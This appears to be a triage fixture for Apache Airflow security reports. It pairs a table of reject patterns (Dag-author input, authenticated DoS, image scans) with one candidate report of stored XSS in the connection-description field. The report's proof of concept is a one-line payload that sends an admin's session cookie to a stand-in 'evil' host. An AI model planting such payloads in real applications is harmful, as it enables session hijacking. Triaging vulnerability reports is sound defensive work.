<!-- SPDX-License-Identifier: Apache-2.0
     https://www.apache.org/licenses/LICENSE-2.0 -->

### Reject-pattern taxonomy (from canned-responses.md)

| Pattern (heading verbatim) | When it applies |
|---|---|
| When someone claims Dag author-provided "user input" is dangerous | Report frames "user input" as untrusted, but the role controlling the input is the Dag author. Dag authors already have arbitrary code execution on the worker, so a Dag author reaching a code/SQL sink is not a privilege-boundary crossing. |
| DoS issues triggered by Authenticated users | Resource-exhaustion / hang triggered by an already-authenticated user. Out of scope unless the impact escapes the documented authenticated-user trust boundary. |
| Image scan results | Third-party dependency CVE reported against the Docker image, with no Airflow-specific reachability or amplification. Out of scope per the Security Model. |

### Candidate report (extracted body)

Subject: Stored XSS in the connection-description field, fires in an admin's browser

A user holding only the *can_edit Connection* permission can store a
`<script>` payload in a connection's description field. When an administrator
later opens the connections list, the payload executes in the admin's browser
session and can be used to exfiltrate the admin's session cookie. Attacker
(low-privilege editor) and victim (admin) are different users, so this is not
self-XSS. PoC: create a connection with `description = <img src=x
onerror=fetch('//evil/'+document.cookie)>`, then have an admin view the list.
